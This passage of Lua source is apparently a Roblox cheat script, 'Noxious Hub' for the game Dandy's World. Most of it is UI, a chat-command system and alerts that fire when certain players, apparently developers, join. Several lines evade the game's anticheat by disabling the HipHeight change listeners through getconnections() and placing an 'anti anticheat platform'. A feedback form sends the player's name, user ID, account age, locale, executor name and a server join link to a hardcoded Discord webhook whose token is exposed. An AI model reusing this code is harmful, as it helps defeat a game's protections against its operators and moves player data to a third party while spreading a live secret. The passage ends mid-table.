		devnotify(player, true) -- Pass `true` to indicate the player just joined
	end)

	-- When a player leaves
	noxious["players"].PlayerRemoving:Connect(function(player)
		devnotified[player.UserId] = nil
	end)

	-- Check existing players when the script starts
	for _, player in ipairs(noxious["players"]:GetPlayers()) do
		devnotify(player, false) -- Pass `false` to indicate the script just started
	end

	-- unable
	local function unablenotify(player, isJoining)
		for _, unablealt in ipairs(noxious["unable"]) do
			if player.Name == unablealt and not unablenotified[player.UserId] then
				if isJoining then
					notify("Unable joined your server.", 5, "unableishere")
				else
					notify("Unable is in your server.", 5, "unableishere")
				end
				unablenotified[player.UserId] = true
			end
		end
	end

	-- When a player joins
	noxious["players"].PlayerAdded:Connect(function(player)
		unablenotify(player, true) -- Pass `true` to indicate the player just joined
	end)

	-- When a player leaves
	noxious["players"].PlayerRemoving:Connect(function(player)
		unablenotified[player.UserId] = nil
	end)

	-- Check existing players when the script starts
	for _, player in ipairs(noxious["players"]:GetPlayers()) do
		unablenotify(player, false) -- Pass `false` to indicate the script just started
	end

	-- ace
	local function acenotify(player, isJoining)
		for _, acealt in ipairs(noxious["ace"]) do
			if player.Name == acealt and not acenotified[player.UserId] then
				if isJoining then
					notify("Ace joined your server.", 5, "aceishere")
				else
					notify("Ace is in your server.", 5, "aceishere")
				end
				acenotified[player.UserId] = true
			end
		end
	end

	-- When a player joins
	noxious["players"].PlayerAdded:Connect(function(player)
		acenotify(player, true) -- Pass `true` to indicate the player just joined
	end)

	-- When a player leaves
	noxious["players"].PlayerRemoving:Connect(function(player)
		acenotified[player.UserId] = nil
	end)

	-- Check existing players when the script starts
	for _, player in ipairs(noxious["players"]:GetPlayers()) do
		acenotify(player, false) -- Pass `false` to indicate the script just started
	end

	-- qwelver
	local function qwelvernotify(player, isJoining)
		for _, fakeqwelver in ipairs(noxious["qwelver"]) do
			if player.Name == fakeqwelver and not qwelvernotified[player.UserId] then
				if isJoining then
					notify("Qwelver joined your server.", 5, "qwelverishere")
				else
					notify("Qwelver is in your server.", 5, "qwelverishere")
				end
				qwelvernotified[player.UserId] = true
			end
		end
	end

	noxious["players"].PlayerAdded:Connect(function(player)
		qwelvernotify(player, true) -- Pass `true` to indicate the player just joined
	end)

	noxious["players"].PlayerRemoving:Connect(function(player)
		qwelvernotified[player.UserId] = nil
	end)

	for _, player in ipairs(noxious["players"]:GetPlayers()) do
		qwelvernotify(player, false) -- Pass `false` to indicate the script just started
	end

	wait(1.5)

	if game.PlaceId ~= noxious["dandy's world lobby"] 
		and game.PlaceId ~= noxious["dandy's world run"] 
		and game.PlaceId ~= noxious["dandy's world roleplay server"] 
		and game.PlaceId ~= noxious["test game"] then

		notify("You aren't in Dandy's World.", 5, "warning")

		wait(1.5)

		notify("This script will not function properly.", 5, "warning")
	end

	-- notify("A new developer note is available.", 5)
end

-------------------------------------------------------------------------------------------------------------------------------

spawn(function() populatecredits(noxious["credits"]) end)
spawn(function() populateInformation(noxious["information"]) end)
spawn(function() populateChangelogs(noxious["changelogs"]) end)
spawn(function() populateinfo() end)

function developernote()

	local messageframe = Instance.new"Frame"		
	messageframe.Size = UDim2.new(0, 594, 0, 337)
	messageframe.BackgroundColor3 = noxious["default black color"]
	messageframe.BorderSizePixel = 1
	messageframe.BorderColor3 = noxious["default white color"]
	messageframe.BackgroundTransparency = 0.2
	messageframe.Parent = noxious["noxious screen gui"]
	messageframe.Visible = true

	local messagetext = Instance.new"TextLabel"		
	messagetext.Size = UDim2.new(0, 594, 0, 277.20000000000005)
	messagetext.Position = UDim2.new(0, 0, 0, 11)
	messagetext.BackgroundColor3 = noxious["default black color"]
	messagetext.BorderSizePixel = 1
	messagetext.BorderColor3 = noxious["default white color"]
	messagetext.BackgroundTransparency = 1
	messagetext.Parent = messageframe
	messagetext.Visible = true
	messagetext.TextColor3 = noxious["default white color"]
	messagetext.Font = Enum.Font.Nunito
	messagetext.TextSize = 20
	messagetext.TextScaled = false
	messagetext.TextWrapped = true
	messagetext.Text = "We are proud to announce that we have a Discord server!\n\nWe recommend that you join the server if you would like to keep track with all the updates and new scripts from Team Noxious.\n\nYou can execute the command 'noxiousdiscord' to copy the Discord link.\ndiscord.gg/p63HPpj5G4"

	local textpadding = Instance.new"UIPadding"
	textpadding.PaddingLeft = UDim.new(0, 20)
	textpadding.PaddingRight = UDim.new(0, 20)
	textpadding.Parent = messagetext

	local messagebutton = Instance.new"TextButton"		
	messagebutton.Size = UDim2.new(0, 144, 0, 48)
	messagebutton.Position = UDim2.new(0, (messagetext.Size.X.Offset - messagebutton.Size.X.Offset) / 2, 0, 250)
	messagebutton.BackgroundColor3 = noxious["default black color"]
	messagebutton.BorderSizePixel = 1
	messagebutton.BorderColor3 = noxious["default white color"]
	messagebutton.BackgroundTransparency = 0.2
	messagebutton.Parent = messageframe
	messagebutton.Visible = true
	messagebutton.TextColor3 = noxious["default white color"]
	messagebutton.Font = Enum.Font.Nunito
	messagebutton.TextSize = 20
	messagebutton.TextScaled = false
	messagebutton.Text = "Alright!"

	messagebutton.MouseButton1Click:Connect(
		function()
			messageframe:Destroy()
			mainframe.Visible = true
			noxious["toggle interface visibility button"].Visible = true
			noxious["click sound"]:Play()
		end
	)

	local function centermessage()
		local screenWidth = game:GetService"Workspace".CurrentCamera.ViewportSize.X
		local screenHeight = game:GetService"Workspace".CurrentCamera.ViewportSize.Y

		local frameWidth = 594			
		local frameHeight = 330			
		local centerX = (screenWidth - frameWidth) / 2
		local centerY = (screenHeight - frameHeight) / 2 - 58

		messageframe.Position = UDim2.new(0, centerX, 0, centerY)
	end
	centermessage()

	local function dragmessage()
		local frame = messageframe
		local dragToggle 			
		local dragSpeed = 0.25
		local dragStart 			
		local startPos 

		local function updatemainframeinput(input)
			local delta = input.Position - dragStart
			local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
				startPos.Y.Scale, startPos.Y.Offset + delta.Y)
			game:GetService'TweenService':Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
		end

		frame.InputBegan:Connect(function(input)
			if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
				dragToggle = true
				dragStart = input.Position
				startPos = frame.Position
				input.Changed:Connect(function()
					if input.UserInputState == Enum.UserInputState.End then
						dragToggle = false
					end
				end)
			end
		end)

		noxious["user input service"].InputChanged:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
				if dragToggle then
					updatemainframeinput(input)
				end
			end
		end)
	end
	dragmessage()

	local topframe = Instance.new"Frame"		
	topframe.Size = UDim2.new(0.9999000000000001, 0, 0, 52.800000000000004)
	topframe.BackgroundColor3 = noxious["default black color"]
	topframe.BorderColor3 = noxious["default white color"]
	topframe.BorderSizePixel = 1
	topframe.Parent = messageframe

	local closemessage = Instance.new"TextButton"		
	closemessage.Size = UDim2.new(0, 36.300000000000004, 0, 36.300000000000004)
	closemessage.BackgroundColor3 = noxious["default black color"]
	closemessage.Position = UDim2.new(0.9256, 0, 0.157, 0)
	closemessage.BorderColor3 = noxious["default white color"]
	closemessage.BorderSizePixel = 1
	closemessage.TextColor3 = noxious["default white color"]
	closemessage.Font = Enum.Font.Nunito
	closemessage.TextSize = 20
	closemessage.TextScaled = false
	closemessage.Text = "X"
	closemessage.TextXAlignment = Enum.TextXAlignment.Center
	closemessage.TextYAlignment = Enum.TextYAlignment.Center
	closemessage.Parent = topframe

	local reposmessage = Instance.new"TextButton"		
	reposmessage.Size = UDim2.new(0, 36.3, 0, 36.3)
	reposmessage.BackgroundColor3 = noxious["default black color"]
	reposmessage.Position = UDim2.new(0.8489, 0, 0.158, 0)
	reposmessage.BorderColor3 = noxious["default white color"]
	reposmessage.BorderSizePixel = 1
	reposmessage.TextColor3 = noxious["default white color"]
	reposmessage.Font = Enum.Font.Nunito
	reposmessage.TextSize = 20
	reposmessage.TextScaled = false
	reposmessage.Text = "R"
	reposmessage.TextXAlignment = Enum.TextXAlignment.Center
	reposmessage.TextYAlignment = Enum.TextYAlignment.Center
	reposmessage.Parent = topframe

	reposmessage.MouseButton1Click:Connect(
		function()
			centermessage()
			noxious["click sound"]:Play()
		end
	)

	closemessage.MouseButton1Click:Connect(
		function()
			messageframe:Destroy()
			noxious["click sound"]:Play()
			mainframe.Visible = true
			noxious["toggle interface visibility button"].Visible = true
		end
	)

	local messagetopframetxt = Instance.new"TextLabel"		
	messagetopframetxt.Size = UDim2.new(0.55, 0, 1.1, 0)
	messagetopframetxt.Position = UDim2.new(0.019, 8, 0, -2)
	messagetopframetxt.BackgroundTransparency = 1
	messagetopframetxt.TextColor3 = noxious["default white color"]
	messagetopframetxt.Font = Enum.Font.Nunito
	messagetopframetxt.TextSize = 21.6
	messagetopframetxt.TextScaled = false
	messagetopframetxt.Text = "Message / Noxious Hub: Dandy's World"
	messagetopframetxt.TextXAlignment = Enum.TextXAlignment.Left
	messagetopframetxt.Parent = topframe

	if mainframe.Visible == true then
		messageframe:Destroy()
	end
end

-------------------------------------------------------------------------------------------------------------------------------

noxious["developer note button"].MouseButton1Click:Connect(
	function()
		noxious["click sound"]:Play()
		mainframe.Visible = false
		noxious["toggle interface visibility button"].Visible = false
		developernote()
	end
)

-------------------------------------------------------------------------------------------------------------------------------

local sendcooldown = false

function feedbackframe()
	mainframe.Visible = false
	noxious["toggle interface visibility button"].Visible = false

	local messageframe = Instance.new"Frame"		
	messageframe.Size = UDim2.new(0, 594, 0, 337)
	messageframe.BackgroundColor3 = noxious["default black color"]
	messageframe.BorderSizePixel = 1
	messageframe.BorderColor3 = noxious["default white color"]
	messageframe.BackgroundTransparency = 0.2
	messageframe.Parent = noxious["noxious screen gui"]
	messageframe.Visible = true

	local messagetext = Instance.new"TextLabel"		
	messagetext.Size = UDim2.new(0, 594, 0, 277.20000000000005)
	messagetext.Position = UDim2.new(0, 0, 0, 11)
	messagetext.BackgroundColor3 = noxious["default black color"]
	messagetext.BorderSizePixel = 1
	messagetext.BorderColor3 = noxious["default white color"]
	messagetext.BackgroundTransparency = 1
	messagetext.Parent = messageframe
	messagetext.Visible = true
	messagetext.TextColor3 = noxious["default white color"]
	messagetext.Font = Enum.Font.Nunito
	messagetext.TextSize = 20
	messagetext.TextScaled = false
	messagetext.TextWrapped = true
	messagetext.Text = "Enter your feedback in the box below and press the send button once you've finished writing.\n\nEnter your personal feedback about the script, or make suggestions!"

	local textpadding = Instance.new"UIPadding"
	textpadding.PaddingLeft = UDim.new(0, 20)
	textpadding.PaddingRight = UDim.new(0, 20)
	textpadding.Parent = messagetext

	local messagebutton = Instance.new"TextButton"		
	messagebutton.Size = UDim2.new(0, 144, 0, 48)
	messagebutton.Position = UDim2.new(0, (messagetext.Size.X.Offset - messagebutton.Size.X.Offset) / 2 + 184, 0, 250)
	messagebutton.BackgroundColor3 = noxious["default black color"]
	messagebutton.BorderSizePixel = 1
	messagebutton.BorderColor3 = noxious["default white color"]
	messagebutton.BackgroundTransparency = 0.2
	messagebutton.Parent = messageframe
	messagebutton.Visible = true
	messagebutton.TextColor3 = noxious["default white color"]
	messagebutton.Font = Enum.Font.Nunito
	messagebutton.TextSize = 20
	messagebutton.TextScaled = false
	messagebutton.Text = "Send"

	local feedbackbox = Instance.new"TextBox"		
	feedbackbox.Size = UDim2.new(0, 325, 0, 48)
	feedbackbox.Position = UDim2.new(0, (feedbackbox.Size.X.Offset - feedbackbox.Size.X.Offset) / 2 + 40, 0, 250)
	feedbackbox.BackgroundColor3 = noxious["default black color"]
	feedbackbox.BorderSizePixel = 1
	feedbackbox.BorderColor3 = noxious["default white color"]
	feedbackbox.BackgroundTransparency = 0.2
	feedbackbox.Parent = messageframe
	feedbackbox.Visible = true
	feedbackbox.TextColor3 = noxious["default white color"]
	feedbackbox.Font = Enum.Font.Nunito
	feedbackbox.TextSize = 20
	feedbackbox.TextScaled = false
	feedbackbox.ClipsDescendants = true
	feedbackbox.TextXAlignment = Enum.TextXAlignment.Left
	feedbackbox.Text = ""
	feedbackbox.PlaceholderColor3 = noxious["default gray color"]
	feedbackbox.PlaceholderText = "Enter feedback"
	feedbackbox.ClearTextOnFocus = false

	local feedbackboxtextpadding = Instance.new"UIPadding"
	feedbackboxtextpadding.PaddingLeft = UDim.new(0, 13)
	feedbackboxtextpadding.PaddingRight = UDim.new(0, 13)
	feedbackboxtextpadding.Parent = feedbackbox

	messagebutton.MouseButton1Click:Connect(function()
		noxious["click sound"]:Play()
		if sendcooldown == true then return end
		sendcooldown = true
		local DName = noxious["local player"].DisplayName
		local Name = noxious["local player"].Name
		local Userid = noxious["local player"].UserId
		local AccountAge = noxious["local player"].AccountAge
		local Country = game.LocalizationService.RobloxLocaleId
		local ConsoleJobId = game.JobId
		local feedback = feedbackbox.Text
		if feedback == "" then return end

		local GAMENAME = noxious["marketplace service"]:GetProductInfo(game.PlaceId).Name

		local function detectExecutor()
			return identifyexecutor()
		end

		local function createWebhookData()
			local webhookcheck = detectExecutor()

			local data = {
				avatar_url="",
				content="**" .. DName .. " (@" .. Name .. ")** Sent script feedback from **Noxious Hub: Dandys World (Version " .. noxious["version"] .. ")** | [**View Player**](https://www.roblox.com/users/"..Userid..") | [**Join Server**](https://www.roblox.com/games/start?placeId=16302670534&launchData=".. game.PlaceId .."/" ..ConsoleJobId..")",
				embeds={
					{
						author={
							name="",
							url="https://roblox.com",
						},
						description=tostring(
							"\n\n**[Noxious Info]:**" ..
								"\n**• Version:** `"..noxious["version"].."`" ..

								"\n\n**[[User Info]:](https://www.roblox.com/users/"..Userid..")**" ..
								"\n**• Display Name:** `"..DName.."`" ..
								"\n**• Username:** `"..Name.."`" .. 
								"\n**• Account Age:** `"..AccountAge.."`" ..
								"\n**• Executor:** `"..webhookcheck.."`" ..
								"\n**• Country:** `"..Country.."`" ..

								"\n\n**[[Game Info]:](https://www.roblox.com/games/"..game.PlaceId..")**" ..
								"\n**• Game:** `"..GAMENAME.."`" ..

								"\n\n**[Feedback]:**" ..
								"\n`"..feedback.."`"

						),
						type="rich",
						color=tonumber"0xFFFFFF",
						thumbnail={
							url="https://www.roblox.com/headshot-thumbnail/image?userId=" .. noxious["local player"].UserId .. "&width=420&height=420&format=png"
						},
					}
				}
			}
			return noxious["http service"]:JSONEncode(data)
		end

		local function sendWebhook(webhookUrl, data)
			local headers = {
				["content-type"] = "application/json"
			}

			local request = http_request or request or HttpPost or syn.request
			local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
			request(abcdef)
		end

		local webhookUrl = "https://discord.com/api/webhooks/1362795675313508442/c_tfiX9TmMRCaWbN9pEBhivPtgLrx1qcE9VNpHTmNuKbCxU6goAFCswGTawQNK5MVdh4"
		local webhookData = createWebhookData()

		spawn(function() sendWebhook(webhookUrl, webhookData) end)
		wait(10)
		sendcooldown = false
	end)

	local function centerfeedback()
		local screenWidth = game:GetService"Workspace".CurrentCamera.ViewportSize.X
		local screenHeight = game:GetService"Workspace".CurrentCamera.ViewportSize.Y

		-- Calculate the position to center the frame on the screen
		local frameWidth = 594
		local frameHeight = 330
		local centerX = (screenWidth - frameWidth) / 2
		local centerY = (screenHeight - frameHeight) / 2 - 58

		-- Set the position to center it on the screen
		messageframe.Position = UDim2.new(0, centerX, 0, centerY)
	end
	centerfeedback()

	local function dragmessage()
		local frame = messageframe
		local dragToggle 			
		local dragSpeed = 0.25
		local dragStart 			
		local startPos 

		local function updatemainframeinput(input)
			local delta = input.Position - dragStart
			local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
				startPos.Y.Scale, startPos.Y.Offset + delta.Y)
			game:GetService'TweenService':Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
		end

		frame.InputBegan:Connect(function(input)
			if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
				dragToggle = true
				dragStart = input.Position
				startPos = frame.Position
				input.Changed:Connect(function()
					if input.UserInputState == Enum.UserInputState.End then
						dragToggle = false
					end
				end)
			end
		end)

		noxious["user input service"].InputChanged:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
				if dragToggle then
					updatemainframeinput(input)
				end
			end
		end)
	end
	dragmessage()

	local topframe = Instance.new"Frame"		
	topframe.Size = UDim2.new(0.9999000000000001, 0, 0, 52.800000000000004)
	topframe.BackgroundColor3 = noxious["default black color"]
	topframe.BorderColor3 = noxious["default white color"]
	topframe.BorderSizePixel = 1
	topframe.Parent = messageframe

	local closemessage = Instance.new"TextButton"		
	closemessage.Size = UDim2.new(0, 36.300000000000004, 0, 36.300000000000004)
	closemessage.BackgroundColor3 = noxious["default black color"]
	closemessage.Position = UDim2.new(0.9256, 0, 0.157, 0)
	closemessage.BorderColor3 = noxious["default white color"]
	closemessage.BorderSizePixel = 1
	closemessage.TextColor3 = noxious["default white color"]
	closemessage.Font = Enum.Font.Nunito
	closemessage.TextSize = 20
	closemessage.TextScaled = false
	closemessage.Text = "X"
	closemessage.TextXAlignment = Enum.TextXAlignment.Center
	closemessage.TextYAlignment = Enum.TextYAlignment.Center
	closemessage.Parent = topframe

	local reposmessage = Instance.new"TextButton"		
	reposmessage.Size = UDim2.new(0, 36.3, 0, 36.3)
	reposmessage.BackgroundColor3 = noxious["default black color"]
	reposmessage.Position = UDim2.new(0.8489, 0, 0.158, 0)
	reposmessage.BorderColor3 = noxious["default white color"]
	reposmessage.BorderSizePixel = 1
	reposmessage.TextColor3 = noxious["default white color"]
	reposmessage.Font = Enum.Font.Nunito
	reposmessage.TextSize = 20
	reposmessage.TextScaled = false
	reposmessage.Text = "R"
	reposmessage.TextXAlignment = Enum.TextXAlignment.Center
	reposmessage.TextYAlignment = Enum.TextYAlignment.Center
	reposmessage.Parent = topframe

	reposmessage.MouseButton1Click:Connect(
		function()
			centerfeedback()
			noxious["click sound"]:Play()
		end
	)

	closemessage.MouseButton1Click:Connect(
		function()
			messageframe:Destroy()
			noxious["click sound"]:Play()
			mainframe.Visible = true
			noxious["toggle interface visibility button"].Visible = true
		end
	)

	local messagetopframetxt = Instance.new"TextLabel"		
	messagetopframetxt.Size = UDim2.new(0.55, 0, 1.1, 0)
	messagetopframetxt.Position = UDim2.new(0.019, 8, 0, -2)
	messagetopframetxt.BackgroundTransparency = 1
	messagetopframetxt.TextColor3 = noxious["default white color"]
	messagetopframetxt.Font = Enum.Font.Nunito
	messagetopframetxt.TextSize = 21.6
	messagetopframetxt.TextScaled = false
	messagetopframetxt.Text = "Message / Noxious Hub: Dandy's World"
	messagetopframetxt.TextXAlignment = Enum.TextXAlignment.Left
	messagetopframetxt.Parent = topframe

	if mainframe.Visible == true then
		messageframe:Destroy()
	end
end

-------------------------------------------------------------------------------------------------------------------------------

function closeallnotificationswithkey(input, gameProcessedEvent)
	if gameProcessedEvent then
		return
	end

	if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == Enum.KeyCode.X then
		closeallnotifs()
	end
end

noxious["user input service"].InputBegan:Connect(closeallnotificationswithkey)

-------------------------------------------------------------------------------------------------------------------------------

print("---------------------------------------------------------------------------")	
print("[Noxious Hub]: Thank you for choosing us!")	
print("---------------------------------------------------------------------------")	
print("[Noxious Hub]: Welcome to Noxious Hub: Dandy's World"	)
print("[Noxious Hub]: Script is still in development. Expect bugs."	)
print("---------------------------------------------------------------------------")	
print("[Noxious Hub]: Current version: " .. noxious["version"])
print("---------------------------------------------------------------------------")

if game.PlaceId == noxious["dandy's world lobby"] then
	print("[Noxious Hub]: You are currently in: The lobby.")	
end

if game.PlaceId == noxious["dandy's world run"] then
	print("[Noxious Hub]: You are currently in: A run.")	
end

if game.PlaceId == noxious["dandy's world roleplay server"] then
	print("[Noxious Hub]: You are currently in: A Roleplay Server.")	
end

if game.PlaceId == noxious["test game"] then
	print("[Noxious Hub]: You are currently in: The Test Game.")	
end

if game.PlaceId ~= noxious["test game"] and game.PlaceId ~= noxious["dandy's world run"] and game.PlaceId ~= noxious["dandy's world lobby"] and game.PlaceId ~= noxious["dandy's world roleplay server"] then
	print("[Noxious Hub]: You aren't in Dandy's World.")	
end

print("---------------------------------------------------------------------------")	
print("[Noxious Hub]: Hover over a command to view its info.")	
print("---------------------------------------------------------------------------")

-------------------------------------------------------------------------------------------------------------------------------

spawn(function()
	if game.PlaceId == noxious["dandy's world run"] then
		noxious["anti anticheat platform"] = Instance.new("Part")
		noxious["anti anticheat platform"].Size = Vector3.new(2048, 1, 2048)
		noxious["anti anticheat platform"].Position = Vector3.new(0, 135, 0)
		noxious["anti anticheat platform"].Anchored = true
		noxious["anti anticheat platform"].Name = "NoxiousAntiAnticheatPlatform"
		noxious["anti anticheat platform"].Material = Enum.Material.Neon
		noxious["anti anticheat platform"].Color = Color3.new(0, 0, 0)
		noxious["anti anticheat platform"].Parent = game.Workspace
	end
end)

spawn(function()
	if game.PlaceId ~= noxious["test game"] then
		for i, v in getconnections(game:GetService("Players").LocalPlayer.Character.Humanoid:GetPropertyChangedSignal("HipHeight")) do
			v:Disable()
		end;
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

local commands = {}
local prefix = "."
local prefixreq = true
local lastCommandTime = 0
local commandCooldown = 0.2
local txtchatsvc = game:GetService("TextChatService").ChatVersion == Enum.ChatVersion.TextChatService
local suppressCommandError = false -- New flag to control error notifications

function addcommand(name, shortname, func)
	commands[string.lower(name)] = func
	if shortname and shortname ~= "" then
		commands[string.lower(shortname)] = func
	end
end

function changeprefix(newprefix)
	if newprefix and newprefix ~= "" then
		prefix = newprefix
	end
end

local function parsecmds(input)
	local cmdgroups = {}
	local currentcmd = {}

	local words = {}
	for word in string.gmatch(input, "[^%s]+") do
		table.insert(words, word)
	end

	for i, word in ipairs(words) do
		if word:sub(1, #prefix) == prefix then
			if #currentcmd > 0 then
				table.insert(cmdgroups, currentcmd)
			end
			currentcmd = {word:sub(#prefix + 1)}
		elseif #currentcmd == 0 then
			currentcmd = {word}
		else
			table.insert(currentcmd, word)
		end
	end

	if #currentcmd > 0 then
		table.insert(cmdgroups, currentcmd)
	end

	return cmdgroups
end

local function execcmd(input)
	local cmdgroups = parsecmds(input)

	if prefixreq and #cmdgroups > 1 then
		for _, cmd in ipairs(cmdgroups) do
			local cmdname = string.lower(cmd[1])
			if not commands[cmdname] then
				return false
			end
		end
	end

	local executed = false
	for _, cmd in ipairs(cmdgroups) do
		local cmdname = string.lower(table.remove(cmd, 1))
		local commandFunc = commands[cmdname]
		if commandFunc then
			commandFunc(table.unpack(cmd))
			executed = true
		end
	end

	if executed then
		local now = tick()
		if now - lastCommandTime >= commandCooldown then
			lastCommandTime = now
		end
	end

	return executed
end

























if txtchatsvc then
	game:GetService("TextChatService").OnIncomingMessage = function(message)
		if message.TextSource then
			noxious["players"]:GetPlayerByUserId(message.TextSource.UserId)
			if noxious["loaded"] == false then return end
			-- onmsg(message.Text, speaker)
		end
	end
else
	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(messageData)
		if messageData.FromSpeaker == noxious["players"].LocalPlayer.Name then
			if noxious["loaded"] == false then return end
		end
	end)
end

local function handle(command, clr)
	if command == "" then return end

	if clr then
		noxious["command bar"].Text = ""
	end

	local success = execcmd(command)

	-- Try with prefix if not successful
	if not success then
		local words = {}
		for word in string.gmatch(command, "[^%s]+") do
			table.insert(words, word)
		end

		if #words > 0 then
			words[1] = prefix .. words[1]
			success = execcmd(table.concat(words, " "))
		end
	end

	-- Only notify if not suppressed and command failed
	if not success and not suppressCommandError then
		notify("Unknown command or invalid arguments.", 5, "error")
	end
end

noxious["execute button"].MouseButton1Click:Connect(function()
	noxious["click sound"]:Play()
	local command = noxious["command bar"].Text
	if command == "" then notify("Unknown command or invalid arguments.", 5, "error") return end
	handle(command, false) 
end)

noxious["command bar"].FocusLost:Connect(function(enterPressed)
	if enterPressed then
		local command = noxious["command bar"].Text
		handle(command, true)
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

local character = noxious["local player"].Character or noxious["local player"].CharacterAdded:Wait()

function updateCharacterReferences(newCharacter)
	character = newCharacter
	character:WaitForChild"Humanoid"	
end

noxious["local player"].CharacterAdded:Connect(updateCharacterReferences)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("reloadnoxious", "reloadnxs", function()
	reloadnoxiouscommand()
end)

addcommand("repositionnoxious", "reposnxs", function()
	centermainframe()
end)

addcommand("hidenoxious", "hidenxs", function()
	toggleVisibility()
end)

addcommand("destroynoxious", "destroynxs", function()
	noxious["noxious screen gui"]:Destroy()
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("getnoxiouspremium", "gnp", function()
	local everyClipboard = setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set)

	function toClipboard(txt)
		if everyClipboard then
			everyClipboard(tostring(txt))
			notify("Copied to clipboard.", 5)
		else
			notify("Unable to access clipboard.", 5, "error")
		end
	end
	toClipboard("https://www.roblox.com/game-pass/1085884381/Lifetime-Noxious-Premium")
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("feedback", "feedback", function()
	mainframe.Visible = false
	noxious["toggle interface visibility button"].Visible = false

	local messageframe = Instance.new"Frame"		
	messageframe.Size = UDim2.new(0, 594, 0, 337)
	messageframe.BackgroundColor3 = noxious["default black color"]
	messageframe.BorderSizePixel = 1
	messageframe.BorderColor3 = noxious["default white color"]
	messageframe.BackgroundTransparency = 0.2
	messageframe.Parent = noxious["noxious screen gui"]
	messageframe.Visible = true

	local messagetext = Instance.new"TextLabel"		
	messagetext.Size = UDim2.new(0, 594, 0, 277.20000000000005)
	messagetext.Position = UDim2.new(0, 0, 0, 11)
	messagetext.BackgroundColor3 = noxious["default black color"]
	messagetext.BorderSizePixel = 1
	messagetext.BorderColor3 = noxious["default white color"]
	messagetext.BackgroundTransparency = 1
	messagetext.Parent = messageframe
	messagetext.Visible = true
	messagetext.TextColor3 = noxious["default white color"]
	messagetext.Font = Enum.Font.Nunito
	messagetext.TextSize = 20
	messagetext.TextScaled = false
	messagetext.TextWrapped = true
	messagetext.Text = "Enter your feedback in the box below and press the send button once you've finished writing.\n\nEnter your personal feedback about the script, or make suggestions!"

	local textpadding = Instance.new"UIPadding"
	textpadding.PaddingLeft = UDim.new(0, 20)
	textpadding.PaddingRight = UDim.new(0, 20)
	textpadding.Parent = messagetext

	local messagebutton = Instance.new"TextButton"		
	messagebutton.Size = UDim2.new(0, 144, 0, 48)
	messagebutton.Position = UDim2.new(0, (messagetext.Size.X.Offset - messagebutton.Size.X.Offset) / 2 + 184, 0, 250)
	messagebutton.BackgroundColor3 = noxious["default black color"]
	messagebutton.BorderSizePixel = 1
	messagebutton.BorderColor3 = noxious["default white color"]
	messagebutton.BackgroundTransparency = 0.2
	messagebutton.Parent = messageframe
	messagebutton.Visible = true
	messagebutton.TextColor3 = noxious["default white color"]
	messagebutton.Font = Enum.Font.Nunito
	messagebutton.TextSize = 20
	messagebutton.TextScaled = false
	messagebutton.Text = "Send"

	local feedbackbox = Instance.new"TextBox"		
	feedbackbox.Size = UDim2.new(0, 325, 0, 48)
	feedbackbox.Position = UDim2.new(0, (feedbackbox.Size.X.Offset - feedbackbox.Size.X.Offset) / 2 + 40, 0, 250)
	feedbackbox.BackgroundColor3 = noxious["default black color"]
	feedbackbox.BorderSizePixel = 1
	feedbackbox.BorderColor3 = noxious["default white color"]
	feedbackbox.BackgroundTransparency = 0.2
	feedbackbox.Parent = messageframe
	feedbackbox.Visible = true
	feedbackbox.TextColor3 = noxious["default white color"]
	feedbackbox.Font = Enum.Font.Nunito
	feedbackbox.TextSize = 20
	feedbackbox.TextScaled = false
	feedbackbox.ClipsDescendants = true
	feedbackbox.TextXAlignment = Enum.TextXAlignment.Left
	feedbackbox.Text = ""
	feedbackbox.PlaceholderColor3 = noxious["default gray color"]
	feedbackbox.PlaceholderText = "Enter feedback"
	feedbackbox.ClearTextOnFocus = false

	local feedbackboxtextpadding = Instance.new"UIPadding"
	feedbackboxtextpadding.PaddingLeft = UDim.new(0, 13)
	feedbackboxtextpadding.PaddingRight = UDim.new(0, 13)
	feedbackboxtextpadding.Parent = feedbackbox

	messagebutton.MouseButton1Click:Connect(function()
		noxious["click sound"]:Play()
		local DName = noxious["local player"].DisplayName
		local Name = noxious["local player"].Name
		local Userid = noxious["local player"].UserId
		local AccountAge = noxious["local player"].AccountAge
		local Country = game.LocalizationService.RobloxLocaleId
		local ConsoleJobId = game.JobId
		local feedback = feedbackbox.Text

		local GAMENAME = noxious["marketplace service"]:GetProductInfo(game.PlaceId).Name

		local function detectExecutor()
			return identifyexecutor()
		end

		local function createWebhookData()
			local webhookcheck = detectExecutor()

			local data = {
				avatar_url="",
				content="**" .. DName .. " (@" .. Name .. ")** Sent script feedback from **Noxious Hub: Dandys World (Version " .. noxious["version"] .. ")** | [**View Player**](https://www.roblox.com/users/"..Userid..") | [**Join Server**](https://www.roblox.com/games/start?placeId=16302670534&launchData=".. game.PlaceId .."/" ..ConsoleJobId..")",
				embeds={
					{
						author={
							name="",
							url="https://roblox.com",
						},
						description=tostring(
							"\n\n**[Noxious Info]:**" ..
								"\n**• Version:** `"..noxious["version"].."`" ..

								"\n\n**[[User Info]:](https://www.roblox.com/users/"..Userid..")**" ..
								"\n**• Display Name:** `"..DName.."`" ..
								"\n**• Username:** `"..Name.."`" .. 
								"\n**• Account Age:** `"..AccountAge.."`" ..
								"\n**• Executor:** `"..webhookcheck.."`" ..
								"\n**• Country:** `"..Country.."`" ..

								"\n\n**[[Game Info]:](https://www.roblox.com/games/"..game.PlaceId..")**" ..
								"\n**• Game:** `"..GAMENAME.."`" ..

								"\n\n**[Feedback]:**" ..
								"\n`"..feedback.."`"

						),
